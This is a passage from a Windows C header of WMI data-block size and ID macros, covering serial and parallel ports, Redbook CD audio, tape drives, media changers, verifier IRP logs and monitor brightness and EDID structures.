#define SERIAL_WMI_COMMPROP_wPacketLength_ID 1
#define SERIAL_WMI_COMMPROP_wPacketVersion_SIZE sizeof(USHORT)
#define SERIAL_WMI_COMMPROP_wPacketVersion_ID 2
#define SERIAL_WMI_COMMPROP_dwServiceMask_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwServiceMask_ID 3
#define SERIAL_WMI_COMMPROP_dwReserved1_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwReserved1_ID 4
#define SERIAL_WMI_COMMPROP_dwMaxTxQueue_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwMaxTxQueue_ID 5
#define SERIAL_WMI_COMMPROP_dwMaxRxQueue_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwMaxRxQueue_ID 6
#define SERIAL_WMI_COMMPROP_dwMaxBaud_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwMaxBaud_ID 7
#define SERIAL_WMI_COMMPROP_dwProvSubType_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwProvSubType_ID 8
#define SERIAL_WMI_COMMPROP_dwProvCapabilities_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwProvCapabilities_ID 9
#define SERIAL_WMI_COMMPROP_dwSettableParams_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwSettableParams_ID 10
#define SERIAL_WMI_COMMPROP_dwSettableBaud_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwSettableBaud_ID 11
#define SERIAL_WMI_COMMPROP_wSettableData_SIZE sizeof(USHORT)
#define SERIAL_WMI_COMMPROP_wSettableData_ID 12
#define SERIAL_WMI_COMMPROP_wSettableStopParity_SIZE sizeof(USHORT)
#define SERIAL_WMI_COMMPROP_wSettableStopParity_ID 13
#define SERIAL_WMI_COMMPROP_dwCurrentTxQueue_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwCurrentTxQueue_ID 14
#define SERIAL_WMI_COMMPROP_dwCurrentRxQueue_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwCurrentRxQueue_ID 15
#define SERIAL_WMI_COMMPROP_dwProvSpec1_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwProvSpec1_ID 16
#define SERIAL_WMI_COMMPROP_dwProvSpec2_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwProvSpec2_ID 17
#define SERIAL_WMI_COMMPROP_dwProvCharSize_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMMPROP_dwProvCharSize_ID 18
#define SERIAL_WMI_COMMPROP_wcProvChar_ID 19

#define PARPORT_WMI_ALLOC_FREE_COUNTS_PortAllocates_SIZE sizeof(ULONG)
#define PARPORT_WMI_ALLOC_FREE_COUNTS_PortAllocates_ID 1
#define PARPORT_WMI_ALLOC_FREE_COUNTS_PortFrees_SIZE sizeof(ULONG)
#define PARPORT_WMI_ALLOC_FREE_COUNTS_PortFrees_ID 2

#define PARPORT_WMI_ALLOC_FREE_COUNTS_SIZE (FIELD_OFFSET(PARPORT_WMI_ALLOC_FREE_COUNTS, PortFrees) + PARPORT_WMI_ALLOC_FREE_COUNTS_PortFrees_SIZE)

#define PARALLEL_WMI_LOG_INFO_Flags1_SIZE sizeof(ULONG)
#define PARALLEL_WMI_LOG_INFO_Flags1_ID 1
#define PARALLEL_WMI_LOG_INFO_Flags2_SIZE sizeof(ULONG)
#define PARALLEL_WMI_LOG_INFO_Flags2_ID 2
#define PARALLEL_WMI_LOG_INFO_spare_SIZE sizeof(ULONG[2])
#define PARALLEL_WMI_LOG_INFO_spare_ID 3
#define PARALLEL_WMI_LOG_INFO_SppWriteCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_SppWriteCount_ID 4
#define PARALLEL_WMI_LOG_INFO_NibbleReadCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_NibbleReadCount_ID 5
#define PARALLEL_WMI_LOG_INFO_BoundedEcpWriteCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_BoundedEcpWriteCount_ID 6
#define PARALLEL_WMI_LOG_INFO_BoundedEcpReadCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_BoundedEcpReadCount_ID 7
#define PARALLEL_WMI_LOG_INFO_HwEcpWriteCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_HwEcpWriteCount_ID 8
#define PARALLEL_WMI_LOG_INFO_HwEcpReadCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_HwEcpReadCount_ID 9
#define PARALLEL_WMI_LOG_INFO_SwEcpWriteCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_SwEcpWriteCount_ID 10
#define PARALLEL_WMI_LOG_INFO_SwEcpReadCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_SwEcpReadCount_ID 11
#define PARALLEL_WMI_LOG_INFO_HwEppWriteCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_HwEppWriteCount_ID 12
#define PARALLEL_WMI_LOG_INFO_HwEppReadCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_HwEppReadCount_ID 13
#define PARALLEL_WMI_LOG_INFO_SwEppWriteCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_SwEppWriteCount_ID 14
#define PARALLEL_WMI_LOG_INFO_SwEppReadCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_SwEppReadCount_ID 15
#define PARALLEL_WMI_LOG_INFO_ByteReadCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_ByteReadCount_ID 16
#define PARALLEL_WMI_LOG_INFO_ChannelNibbleReadCount_SIZE sizeof(LONGLONG)
#define PARALLEL_WMI_LOG_INFO_ChannelNibbleReadCount_ID 17

#define PARALLEL_WMI_LOG_INFO_SIZE (FIELD_OFFSET(PARALLEL_WMI_LOG_INFO, ChannelNibbleReadCount) + PARALLEL_WMI_LOG_INFO_ChannelNibbleReadCount_SIZE)

#define REDBOOK_WMI_NUMBER_OF_BUFFERS_SIZE sizeof(ULONG)
#define REDBOOK_WMI_NUMBER_OF_BUFFERS_ID 1
#define REDBOOK_WMI_SECTORS_PER_READ_SIZE sizeof(ULONG)
#define REDBOOK_WMI_SECTORS_PER_READ_ID 2
#define REDBOOK_WMI_SECTORS_PER_READ_MASK_SIZE sizeof(ULONG)
#define REDBOOK_WMI_SECTORS_PER_READ_MASK_ID 3
#define REDBOOK_WMI_MAX_SECTORS_PER_READ_SIZE sizeof(ULONG)
#define REDBOOK_WMI_MAX_SECTORS_PER_READ_ID 4
#define REDBOOK_WMI_PLAY_ENABLED_SIZE sizeof(BOOLEAN)
#define REDBOOK_WMI_PLAY_ENABLED_ID 5
#define REDBOOK_WMI_CDDA_SUPPORTED_SIZE sizeof(BOOLEAN)
#define REDBOOK_WMI_CDDA_SUPPORTED_ID 6
#define REDBOOK_WMI_CDDA_ACCURATE_SIZE sizeof(BOOLEAN)
#define REDBOOK_WMI_CDDA_ACCURATE_ID 7
#define REDBOOK_WMI_STD_DATA_Reserved1_SIZE sizeof(BOOLEAN)
#define REDBOOK_WMI_STD_DATA_Reserved1_ID 8

#define REDBOOK_WMI_STD_DATA_SIZE (FIELD_OFFSET(REDBOOK_WMI_STD_DATA, Reserved1) + REDBOOK_WMI_STD_DATA_Reserved1_SIZE)

#define REDBOOK_WMI_PERF_TIME_READING_DELAY_SIZE sizeof(LONGLONG)
#define REDBOOK_WMI_PERF_TIME_READING_DELAY_ID 1
#define REDBOOK_WMI_PERF_TIME_READING_SIZE sizeof(LONGLONG)
#define REDBOOK_WMI_PERF_TIME_READING_ID 2
#define REDBOOK_WMI_PERF_TIME_STREAMING_DELAY_SIZE sizeof(LONGLONG)
#define REDBOOK_WMI_PERF_TIME_STREAMING_DELAY_ID 3
#define REDBOOK_WMI_PERF_TIME_STREAMING_SIZE sizeof(LONGLONG)
#define REDBOOK_WMI_PERF_TIME_STREAMING_ID 4
#define REDBOOK_WMI_PERF_DATA_PROCESSED_SIZE sizeof(LONGLONG)
#define REDBOOK_WMI_PERF_DATA_PROCESSED_ID 5
#define REDBOOK_WMI_PERF_STREAM_PAUSED_COUNT_SIZE sizeof(ULONG)
#define REDBOOK_WMI_PERF_STREAM_PAUSED_COUNT_ID 6

#define REDBOOK_WMI_PERF_DATA_SIZE (FIELD_OFFSET(REDBOOK_WMI_PERF_DATA, StreamPausedCount) + REDBOOK_WMI_PERF_DATA_StreamPausedCount_SIZE)

#define RegisteredGuids_GuidType_SIZE sizeof(ULONG)
#define RegisteredGuids_GuidType_ID 1
#define RegisteredGuids_LoggerId_SIZE sizeof(ULONG)
#define RegisteredGuids_LoggerId_ID 2
#define RegisteredGuids_EnableLevel_SIZE sizeof(ULONG)
#define RegisteredGuids_EnableLevel_ID 3
#define RegisteredGuids_EnableFlags_SIZE sizeof(ULONG)
#define RegisteredGuids_EnableFlags_ID 4
#define RegisteredGuids_IsEnabled_SIZE sizeof(BOOLEAN)
#define RegisteredGuids_IsEnabled_ID 5

#define RegisteredGuids_SIZE (FIELD_OFFSET(RegisteredGuids, IsEnabled) + RegisteredGuids_IsEnabled_SIZE)

#define WMI_TAPE_DRIVE_PARAMETERS_MaximumBlockSize_SIZE sizeof(ULONG)
#define WMI_TAPE_DRIVE_PARAMETERS_MaximumBlockSize_ID 1
#define WMI_TAPE_DRIVE_PARAMETERS_MinimumBlockSize_SIZE sizeof(ULONG)
#define WMI_TAPE_DRIVE_PARAMETERS_MinimumBlockSize_ID 2
#define WMI_TAPE_DRIVE_PARAMETERS_DefaultBlockSize_SIZE sizeof(ULONG)
#define WMI_TAPE_DRIVE_PARAMETERS_DefaultBlockSize_ID 3
#define WMI_TAPE_DRIVE_PARAMETERS_MaximumPartitionCount_SIZE sizeof(ULONG)
#define WMI_TAPE_DRIVE_PARAMETERS_MaximumPartitionCount_ID 4
#define WMI_TAPE_DRIVE_PARAMETERS_CompressionCapable_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_DRIVE_PARAMETERS_CompressionCapable_ID 5
#define WMI_TAPE_DRIVE_PARAMETERS_CompressionEnabled_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_DRIVE_PARAMETERS_CompressionEnabled_ID 6
#define WMI_TAPE_DRIVE_PARAMETERS_ReportSetmarks_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_DRIVE_PARAMETERS_ReportSetmarks_ID 7
#define WMI_TAPE_DRIVE_PARAMETERS_HardwareErrorCorrection_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_DRIVE_PARAMETERS_HardwareErrorCorrection_ID 8

#define WMI_TAPE_DRIVE_PARAMETERS_SIZE (FIELD_OFFSET(WMI_TAPE_DRIVE_PARAMETERS, HardwareErrorCorrection) + WMI_TAPE_DRIVE_PARAMETERS_HardwareErrorCorrection_SIZE)

#define WMI_TAPE_MEDIA_PARAMETERS_MaximumCapacity_SIZE sizeof(ULONGLONG)
#define WMI_TAPE_MEDIA_PARAMETERS_MaximumCapacity_ID 1
#define WMI_TAPE_MEDIA_PARAMETERS_AvailableCapacity_SIZE sizeof(ULONGLONG)
#define WMI_TAPE_MEDIA_PARAMETERS_AvailableCapacity_ID 2
#define WMI_TAPE_MEDIA_PARAMETERS_BlockSize_SIZE sizeof(ULONG)
#define WMI_TAPE_MEDIA_PARAMETERS_BlockSize_ID 3
#define WMI_TAPE_MEDIA_PARAMETERS_PartitionCount_SIZE sizeof(ULONG)
#define WMI_TAPE_MEDIA_PARAMETERS_PartitionCount_ID 4
#define WMI_TAPE_MEDIA_PARAMETERS_MediaWriteProtected_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_MEDIA_PARAMETERS_MediaWriteProtected_ID 5

#define WMI_TAPE_MEDIA_PARAMETERS_SIZE (FIELD_OFFSET(WMI_TAPE_MEDIA_PARAMETERS, MediaWriteProtected) + WMI_TAPE_MEDIA_PARAMETERS_MediaWriteProtected_SIZE)

#define WMI_TAPE_SYMBOLIC_NAME_TapeSymbolicName_ID 1

#define WMI_TAPE_PROBLEM_WARNING_DriveProblemType_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_WARNING_DriveProblemType_ID 1
#define WMI_TAPE_PROBLEM_WARNING_TapeData_SIZE sizeof(UCHAR[512])
#define WMI_TAPE_PROBLEM_WARNING_TapeData_ID 2

#define WMI_TAPE_PROBLEM_WARNING_SIZE (FIELD_OFFSET(WMI_TAPE_PROBLEM_WARNING, TapeData) + WMI_TAPE_PROBLEM_WARNING_TapeData_SIZE)

#define WMI_TAPE_PROBLEM_IO_ERROR_ReadCorrectedWithoutDelay_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadCorrectedWithoutDelay_ID 1
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadCorrectedWithDelay_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadCorrectedWithDelay_ID 2
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadTotalErrors_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadTotalErrors_ID 3
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadTotalCorrectedErrors_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadTotalCorrectedErrors_ID 4
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadTotalUncorrectedErrors_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadTotalUncorrectedErrors_ID 5
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadCorrectionAlgorithmProcessed_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_ReadCorrectionAlgorithmProcessed_ID 6
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteCorrectedWithoutDelay_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteCorrectedWithoutDelay_ID 7
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteCorrectedWithDelay_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteCorrectedWithDelay_ID 8
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteTotalErrors_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteTotalErrors_ID 9
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteTotalCorrectedErrors_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteTotalCorrectedErrors_ID 10
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteTotalUncorrectedErrors_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteTotalUncorrectedErrors_ID 11
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteCorrectionAlgorithmProcessed_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_WriteCorrectionAlgorithmProcessed_ID 12
#define WMI_TAPE_PROBLEM_IO_ERROR_NonMediumErrors_SIZE sizeof(ULONG)
#define WMI_TAPE_PROBLEM_IO_ERROR_NonMediumErrors_ID 13

#define WMI_TAPE_PROBLEM_IO_ERROR_SIZE (FIELD_OFFSET(WMI_TAPE_PROBLEM_IO_ERROR, NonMediumErrors) + WMI_TAPE_PROBLEM_IO_ERROR_NonMediumErrors_SIZE)

#define WMI_TAPE_PROBLEM_DEVICE_ERROR_ReadWarning_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_ReadWarning_ID 1
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_WriteWarning_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_WriteWarning_ID 2
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_HardError_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_HardError_ID 3
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_ReadFailure_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_ReadFailure_ID 4
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_WriteFailure_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_WriteFailure_ID 5
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_UnsupportedFormat_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_UnsupportedFormat_ID 6
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_TapeSnapped_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_TapeSnapped_ID 7
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_DriveRequiresCleaning_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_DriveRequiresCleaning_ID 8
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_TimetoCleanDrive_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_TimetoCleanDrive_ID 9
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_DriveHardwareError_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_DriveHardwareError_ID 10
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_ScsiInterfaceError_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_ScsiInterfaceError_ID 11
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_MediaLife_SIZE sizeof(BOOLEAN)
#define WMI_TAPE_PROBLEM_DEVICE_ERROR_MediaLife_ID 12

#define WMI_TAPE_PROBLEM_DEVICE_ERROR_SIZE (FIELD_OFFSET(WMI_TAPE_PROBLEM_DEVICE_ERROR, MediaLife) + WMI_TAPE_PROBLEM_DEVICE_ERROR_MediaLife_SIZE)

#define WMI_CHANGER_PARAMETERS_NumberOfSlots_SIZE sizeof(ULONG)
#define WMI_CHANGER_PARAMETERS_NumberOfSlots_ID 1
#define WMI_CHANGER_PARAMETERS_NumberOfDrives_SIZE sizeof(ULONG)
#define WMI_CHANGER_PARAMETERS_NumberOfDrives_ID 2
#define WMI_CHANGER_PARAMETERS_NumberOfIEPorts_SIZE sizeof(ULONG)
#define WMI_CHANGER_PARAMETERS_NumberOfIEPorts_ID 3
#define WMI_CHANGER_PARAMETERS_NumberOfTransports_SIZE sizeof(ULONG)
#define WMI_CHANGER_PARAMETERS_NumberOfTransports_ID 4
#define WMI_CHANGER_PARAMETERS_NumberOfDoors_SIZE sizeof(ULONG)
#define WMI_CHANGER_PARAMETERS_NumberOfDoors_ID 5
#define WMI_CHANGER_PARAMETERS_NumberOfCleanerSlots_SIZE sizeof(ULONG)
#define WMI_CHANGER_PARAMETERS_NumberOfCleanerSlots_ID 6
#define WMI_CHANGER_PARAMETERS_MagazineSize_SIZE sizeof(ULONG)
#define WMI_CHANGER_PARAMETERS_MagazineSize_ID 7

#define WMI_CHANGER_PARAMETERS_SIZE (FIELD_OFFSET(WMI_CHANGER_PARAMETERS, MagazineSize) + WMI_CHANGER_PARAMETERS_MagazineSize_SIZE)

#define WMI_CHANGER_PROBLEM_WARNING_ChangerProblemType_SIZE sizeof(ULONG)
#define WMI_CHANGER_PROBLEM_WARNING_ChangerProblemType_ID 1
#define WMI_CHANGER_PROBLEM_WARNING_ChangerData_SIZE sizeof(UCHAR[512])
#define WMI_CHANGER_PROBLEM_WARNING_ChangerData_ID 2

#define WMI_CHANGER_PROBLEM_WARNING_SIZE (FIELD_OFFSET(WMI_CHANGER_PROBLEM_WARNING, ChangerData) + WMI_CHANGER_PROBLEM_WARNING_ChangerData_SIZE)

#define WMI_CHANGER_PROBLEM_DEVICE_ERROR_ChangerProblemType_SIZE sizeof(ULONG)
#define WMI_CHANGER_PROBLEM_DEVICE_ERROR_ChangerProblemType_ID 1

#define WMI_CHANGER_PROBLEM_DEVICE_ERROR_SIZE (FIELD_OFFSET(WMI_CHANGER_PROBLEM_DEVICE_ERROR, ChangerProblemType) + WMI_CHANGER_PROBLEM_DEVICE_ERROR_ChangerProblemType_SIZE)

#define DEVICE_UI_FIRMWARE_REVISION_FirmwareRevision_ID 1

#define MSVerifierIrpLogEntry_Count_SIZE sizeof(ULONG)
#define MSVerifierIrpLogEntry_Count_ID 1
#define MSVerifierIrpLogEntry_Major_SIZE sizeof(UCHAR)
#define MSVerifierIrpLogEntry_Major_ID 2
#define MSVerifierIrpLogEntry_Minor_SIZE sizeof(UCHAR)
#define MSVerifierIrpLogEntry_Minor_ID 3
#define MSVerifierIrpLogEntry_Flags_SIZE sizeof(UCHAR)
#define MSVerifierIrpLogEntry_Flags_ID 4
#define MSVerifierIrpLogEntry_Control_SIZE sizeof(UCHAR)
#define MSVerifierIrpLogEntry_Control_ID 5
#define MSVerifierIrpLogEntry_Arg1_SIZE sizeof(ULONGLONG)
#define MSVerifierIrpLogEntry_Arg1_ID 6
#define MSVerifierIrpLogEntry_Arg2_SIZE sizeof(ULONGLONG)
#define MSVerifierIrpLogEntry_Arg2_ID 7
#define MSVerifierIrpLogEntry_Arg3_SIZE sizeof(ULONGLONG)
#define MSVerifierIrpLogEntry_Arg3_ID 8
#define MSVerifierIrpLogEntry_Arg4_SIZE sizeof(ULONGLONG)
#define MSVerifierIrpLogEntry_Arg4_ID 9

#define MSVerifierIrpLogEntry_SIZE (FIELD_OFFSET(MSVerifierIrpLogEntry, Arg4) + MSVerifierIrpLogEntry_Arg4_SIZE)

#define MSVerifierIrpLogInformation_DeviceType_SIZE sizeof(ULONG)
#define MSVerifierIrpLogInformation_DeviceType_ID 1
#define MSVerifierIrpLogInformation_EntryCount_SIZE sizeof(ULONG)
#define MSVerifierIrpLogInformation_EntryCount_ID 2
#define MSVerifierIrpLogInformation_Entries_ID 3

#define WmiMonitorBrightness_CurrentBrightness_SIZE sizeof(UCHAR)
#define WmiMonitorBrightness_CurrentBrightness_ID 1
#define WmiMonitorBrightness_Levels_SIZE sizeof(ULONG)
#define WmiMonitorBrightness_Levels_ID 2
#define WmiMonitorBrightness_Level_ID 3

#define WmiSetBrightness     1

#define WmiSetBrightness_IN_Timeout_SIZE sizeof(ULONG)
#define WmiSetBrightness_IN_Timeout_ID 1
#define WmiSetBrightness_IN_Brightness_SIZE sizeof(UCHAR)
#define WmiSetBrightness_IN_Brightness_ID 2

#define WmiSetBrightness_IN_SIZE (FIELD_OFFSET(WmiSetBrightness_IN, Brightness) + WmiSetBrightness_IN_Brightness_SIZE)

#define WmiRevertToPolicyBrightness     2
#define WmiSetALSBrightnessState     3

#define WmiSetALSBrightnessState_IN_State_SIZE sizeof(BOOLEAN)
#define WmiSetALSBrightnessState_IN_State_ID 1

#define WmiSetALSBrightnessState_IN_SIZE (FIELD_OFFSET(WmiSetALSBrightnessState_IN, State) + WmiSetALSBrightnessState_IN_State_SIZE)

#define WmiSetALSBrightness     4

#define WmiSetALSBrightness_IN_Brightness_SIZE sizeof(UCHAR)
#define WmiSetALSBrightness_IN_Brightness_ID 1

#define WmiSetALSBrightness_IN_SIZE (FIELD_OFFSET(WmiSetALSBrightness_IN, Brightness) + WmiSetALSBrightness_IN_Brightness_SIZE)

#define WmiMonitorBrightnessEvent_Brightness_SIZE sizeof(UCHAR)
#define WmiMonitorBrightnessEvent_Brightness_ID 1

#define WmiMonitorBrightnessEvent_SIZE (FIELD_OFFSET(WmiMonitorBrightnessEvent, Brightness) + WmiMonitorBrightnessEvent_Brightness_SIZE)

#define WmiMonitorRawEEdidV1Block_Id_SIZE sizeof(UCHAR)
#define WmiMonitorRawEEdidV1Block_Id_ID 1
#define WmiMonitorRawEEdidV1Block_Type_SIZE sizeof(UCHAR)
#define WmiMonitorRawEEdidV1Block_Type_ID 2
#define WmiMonitorRawEEdidV1Block_Content_SIZE sizeof(UCHAR[128])
#define WmiMonitorRawEEdidV1Block_Content_ID 3

#define WmiMonitorRawEEdidV1Block_SIZE (FIELD_OFFSET(WmiMonitorRawEEdidV1Block, Content) + WmiMonitorRawEEdidV1Block_Content_SIZE)

#define WmiGetMonitorRawEEdidV1Block     1

#define WmiGetMonitorRawEEdidV1Block_IN_BlockId_SIZE sizeof(UCHAR)
#define WmiGetMonitorRawEEdidV1Block_IN_BlockId_ID 1

#define WmiGetMonitorRawEEdidV1Block_IN_SIZE (FIELD_OFFSET(WmiGetMonitorRawEEdidV1Block_IN, BlockId) + WmiGetMonitorRawEEdidV1Block_IN_BlockId_SIZE)

#define WmiGetMonitorRawEEdidV1Block_OUT_BlockType_SIZE sizeof(UCHAR)
#define WmiGetMonitorRawEEdidV1Block_OUT_BlockType_ID 2
#define WmiGetMonitorRawEEdidV1Block_OUT_BlockContent_SIZE sizeof(UCHAR[128])
#define WmiGetMonitorRawEEdidV1Block_OUT_BlockContent_ID 3

#define WmiGetMonitorRawEEdidV1Block_OUT_SIZE (FIELD_OFFSET(WmiGetMonitorRawEEdidV1Block_OUT, BlockContent) + WmiGetMonitorRawEEdidV1Block_OUT_BlockContent_SIZE)

#define WmiMonitorID_ProductCodeID_SIZE sizeof(USHORT[16])
#define WmiMonitorID_ProductCodeID_ID 1
#define WmiMonitorID_SerialNumberID_SIZE sizeof(USHORT[16])
#define WmiMonitorID_SerialNumberID_ID 2
#define WmiMonitorID_ManufacturerName_SIZE sizeof(USHORT[16])
#define WmiMonitorID_ManufacturerName_ID 3
#define WmiMonitorID_WeekOfManufacture_SIZE sizeof(UCHAR)
#define WmiMonitorID_WeekOfManufacture_ID 4
#define WmiMonitorID_YearOfManufacture_SIZE sizeof(USHORT)
#define WmiMonitorID_YearOfManufacture_ID 5
#define WmiMonitorID_UserFriendlyNameLength_SIZE sizeof(USHORT)
#define WmiMonitorID_UserFriendlyNameLength_ID 6
#define WmiMonitorID_UserFriendlyName_ID 7

#define WmiMonitorSupportedDisplayFeatures_StandbySupported_SIZE sizeof(BOOLEAN)
#define WmiMonitorSupportedDisplayFeatures_StandbySupported_ID 1
#define WmiMonitorSupportedDisplayFeatures_SuspendSupported_SIZE sizeof(BOOLEAN)
#define WmiMonitorSupportedDisplayFeatures_SuspendSupported_ID 2
#define WmiMonitorSupportedDisplayFeatures_ActiveOffSupported_SIZE sizeof(BOOLEAN)
#define WmiMonitorSupportedDisplayFeatures_ActiveOffSupported_ID 3
#define WmiMonitorSupportedDisplayFeatures_DisplayType_SIZE sizeof(UCHAR)
#define WmiMonitorSupportedDisplayFeatures_DisplayType_ID 4
#define WmiMonitorSupportedDisplayFeatures_sRGBSupported_SIZE sizeof(BOOLEAN)
#define WmiMonitorSupportedDisplayFeatures_sRGBSupported_ID 5
#define WmiMonitorSupportedDisplayFeatures_HasPreferredTimingMode_SIZE sizeof(BOOLEAN)
#define WmiMonitorSupportedDisplayFeatures_HasPreferredTimingMode_ID 6
#define WmiMonitorSupportedDisplayFeatures_GTFSupported_SIZE sizeof(BOOLEAN)
#define WmiMonitorSupportedDisplayFeatures_GTFSupported_ID 7

#define WmiMonitorSupportedDisplayFeatures_SIZE (FIELD_OFFSET(WmiMonitorSupportedDisplayFeatures, GTFSupported) + WmiMonitorSupportedDisplayFeatures_GTFSupported_SIZE)

#define WmiMonitorBasicDisplayParams_VideoInputType_SIZE sizeof(UCHAR)
#define WmiMonitorBasicDisplayParams_VideoInputType_ID 1
#define WmiMonitorBasicDisplayParams_MaxHorizontalImageSize_SIZE sizeof(UCHAR)
#define WmiMonitorBasicDisplayParams_MaxHorizontalImageSize_ID 2
#define WmiMonitorBasicDisplayParams_MaxVerticalImageSize_SIZE sizeof(UCHAR)
#define WmiMonitorBasicDisplayParams_MaxVerticalImageSize_ID 3
#define WmiMonitorBasicDisplayParams_DisplayTransferCharacteristic_SIZE sizeof(UCHAR)
#define WmiMonitorBasicDisplayParams_DisplayTransferCharacteristic_ID 4
#define WmiMonitorBasicDisplayParams_SupportedDisplayFeatures_SIZE sizeof(WmiMonitorSupportedDisplayFeatures)
#define WmiMonitorBasicDisplayParams_SupportedDisplayFeatures_ID 5

#define WmiMonitorBasicDisplayParams_SIZE (FIELD_OFFSET(WmiMonitorBasicDisplayParams, SupportedDisplayFeatures) + WmiMonitorBasicDisplayParams_SupportedDisplayFeatures_SIZE)

#define WmiMonitorConnectionParams_VideoOutputTechnology_SIZE sizeof(ULONG)
#define WmiMonitorConnectionParams_VideoOutputTechnology_ID 1

#define WmiMonitorConnectionParams_SIZE (FIELD_OFFSET(WmiMonitorConnectionParams, VideoOutputTechnology) + WmiMonitorConnectionParams_VideoOutputTechnology_SIZE)

#define WmiMonitorAnalogVideoInputParams_SignalLevelStandard_SIZE sizeof(UCHAR)
#define WmiMonitorAnalogVideoInputParams_SignalLevelStandard_ID 1
#define WmiMonitorAnalogVideoInputParams_SetupExpected_SIZE sizeof(UCHAR)
#define WmiMonitorAnalogVideoInputParams_SetupExpected_ID 2
#define WmiMonitorAnalogVideoInputParams_SeparateSyncsSupported_SIZE sizeof(UCHAR)
#define WmiMonitorAnalogVideoInputParams_SeparateSyncsSupported_ID 3
#define WmiMonitorAnalogVideoInputParams_CompositeSyncSupported_SIZE sizeof(UCHAR)
#define WmiMonitorAnalogVideoInputParams_CompositeSyncSupported_ID 4
#define WmiMonitorAnalogVideoInputParams_SyncOnGreenVideoSupported_SIZE sizeof(UCHAR)
#define WmiMonitorAnalogVideoInputParams_SyncOnGreenVideoSupported_ID 5
